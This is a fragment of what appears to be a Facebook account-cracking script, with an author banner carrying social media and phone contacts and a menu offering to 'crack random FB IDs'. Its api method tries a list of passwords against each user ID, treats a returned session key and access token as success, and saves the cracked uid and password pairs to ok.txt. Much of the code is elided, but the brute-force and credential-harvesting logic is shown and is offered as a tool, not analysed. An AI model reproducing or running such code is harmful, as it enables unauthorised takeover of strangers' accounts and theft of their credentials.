...
────────╚══╝                                                                                                                    
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : NOYSHIM
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : NS TEAM
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : NOYSHIM504
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +880183216548)
\033[1;90m══════════════════════════════════════════════════
    """)
...
class Main:
	def __init__(self):
		...
		print("")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 %s[Just-Now-Open]"%(P,G,R,Y,B))
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [BD-71-SAJJAD-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * [_>] %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [BD-71-SAJJAD-CP] %s | %s\033[0;97m         "%(uid, pw))
